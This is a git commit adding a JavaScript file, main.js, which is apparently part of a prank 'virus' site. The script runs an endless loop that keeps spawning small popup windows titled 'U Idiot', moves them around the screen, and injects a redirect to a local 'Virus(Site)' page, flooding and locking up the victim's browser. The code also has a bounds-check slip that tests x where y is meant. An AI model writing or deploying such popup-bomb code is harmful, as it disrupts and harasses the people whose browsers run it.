aaecd8df5c38811d058205e1168c827ea22734d8
ToasterSploit <62103723+ToasterSploit@users.noreply.github.com>
2020-07-09 22:09:07 +0200

    Add files via upload

---
+++ main.js
@@ -0,0 +1,36 @@
+var myWindow
+var leftOrRight = false
+var upOrDown = false
+
+var x = Math.random() * 1000
+var y = Math.random() * 1000
+
+var name = "0"
+while (0 < 10) {
+	if (leftOrRight == true) {
+		x = x - 20
+	} else {
+		x = x + 20
+	}
+
+	if (upOrDown == true) {
+		y = y - 20
+	} else {
+		y = y + 20
+	}
+
+	if (x < 0) {
+		leftOrRight = false
+	} else if (x > 1200) {
+		leftOrRight = true
+	}
+
+	if (y < 0) {
+		upOrDown = false
+	} else if (x > 400) {
+		upOrDown = true
+	}
+	myWindow = window.open("", "", "width=150, height=150");
+	myWindow.document.write("<title>U Idiot</title> <script type='text/javascript'>window.location.href = 'C:/Users/etien/OneDrive/Bureaublad/Virus(Site)/index.html'</script>");
+	myWindow.moveTo(x, y);
+}
